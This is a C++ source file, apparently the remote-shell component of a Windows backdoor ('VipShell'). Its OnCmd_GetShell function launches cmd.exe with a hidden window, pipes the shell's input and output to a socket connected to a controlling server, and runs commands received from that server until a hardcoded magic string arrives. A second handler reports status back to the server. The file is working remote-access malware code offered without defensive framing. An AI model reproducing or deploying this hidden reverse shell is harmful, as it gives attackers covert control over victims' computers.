#include ".\shellcommandproc.h"

CShellCommandProc::CShellCommandProc(void)
{
}

CShellCommandProc::~CShellCommandProc(void)
{
}

void CShellCommandProc::OnCmd_GetShell(tagVipShellCmd* info)
{
//创建CMD线程

	HANDLE               hWritePipe,hReadPipe,hWriteShell,hReadShell;
	SECURITY_ATTRIBUTES  saPipe;
	STARTUPINFO          lpStartupInfo;
	PROCESS_INFORMATION  lpProcessInfo;
	char szBuffer[65535];
	DWORD dwBufferRead;
	int ret;
	saPipe.nLength              = sizeof(saPipe);
	saPipe.bInheritHandle       = TRUE;
	saPipe.lpSecurityDescriptor = NULL;

	//create read and write pipe
	CreatePipe(&hReadPipe, &hReadShell, &saPipe, 0);
	CreatePipe(&hWriteShell, &hWritePipe, &saPipe, 0);

	GetStartupInfo(&lpStartupInfo);
	lpStartupInfo.cb           = sizeof(lpStartupInfo);
	lpStartupInfo.dwFlags      = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	lpStartupInfo.hStdInput    = hWriteShell;
	lpStartupInfo.hStdOutput   = hReadShell;
	lpStartupInfo.hStdError    = hReadShell;
	lpStartupInfo.wShowWindow  = SW_HIDE;
	lpStartupInfo.lpDesktop = L"WinSta0\\Default"; 

	WCHAR cmdline[MAX_PATH];
	GetSystemDirectory(cmdline,MAX_PATH);
	lstrcatW(cmdline,L"\\cmd.exe");
	ret = CreateProcess(cmdline, NULL, NULL,NULL,TRUE,0,NULL,NULL,&lpStartupInfo,&lpProcessInfo);
	while(1)
	{
		memset(szBuffer, 0, sizeof(szBuffer));
		PeekNamedPipe(hReadPipe, szBuffer, sizeof(szBuffer), &dwBufferRead,NULL,NULL);
		if(dwBufferRead != 0)
		{
			ret = ReadFile(hReadPipe, szBuffer, sizeof(szBuffer), &dwBufferRead,NULL);
			if(ret)
			{
				if( m_hServer->Send(szBuffer, dwBufferRead) == SOCKET_ERROR)
					break;
			}
		}
		else
		{
			ZeroMemory(szBuffer, sizeof(szBuffer));
			ret = m_hServer->Recv(szBuffer, sizeof(szBuffer), 0, false);
			if(ret == SOCKET_ERROR)
				break;
			if(strcmp("zhuifengjian love lixing!", szBuffer) == 0)
				break;
			if(ret != 0)
				WriteFile(hWritePipe, szBuffer, ret, &dwBufferRead, 0);
		}
		Sleep(100);
	}
	WriteFile(hWritePipe, "exit\r\n", (DWORD)strlen("exit\r\n"), &dwBufferRead, 0);	
}

void CShellCommandProc::OnCmd_GetDoWork(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = 2; 
//	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}